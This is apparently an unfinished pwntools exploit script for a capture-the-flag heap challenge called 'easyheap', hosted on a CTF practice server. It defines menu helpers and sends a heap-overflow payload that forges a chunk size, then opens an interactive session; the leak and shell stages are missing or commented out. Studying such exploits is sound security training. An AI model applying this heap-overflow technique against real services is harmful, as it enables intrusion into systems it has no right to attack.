# -*- coding: utf-8 -*-
from pwn import *
elf_file = FILENAME = './easyheap'
elf = context.binary = ELF(elf_file)
context.log_level = 'debug' # output verbose log



HOST = 'node4.buuoj.cn'
POST = 28317
libc = ELF("./libc-2.23.so")
'''
HOST = 'localhost'
POST = 7777
libc = ELF("./libc.so.6")
#libc = ELF("./libc6-amd64_2.27-3ubuntu1_i386/data/lib64/libc.so.6")
'''
c = remote(HOST, POST)


def create(size,s):
  c.sendlineafter('Your choice :','1')
  c.sendlineafter('Size of Heap :',str(size))
  c.sendlineafter('Content of heap:',str(s))
  sleep(1)

def edit(index,size,s):
  c.sendlineafter('Your choice :','2')
  c.sendlineafter('Index :',str(index))
  c.sendlineafter('Size of Heap :',str(size))
  c.sendlineafter('Content of heap :',str(s))
  sleep(1)

def delete(index):
  c.sendline('3')
  c.sendline(str(index))

def end():
  c.sendline('4')

create(20,0)
create(20,1)
#create(20,2)
#|20:0|20:1||20:2|
#delete(1)
#|20:0|21:0||20:2
payload = '\x00'*0x20 
payload+= p64(0x21)
edit(0,40,payload)
#delete(1)

c.interactive()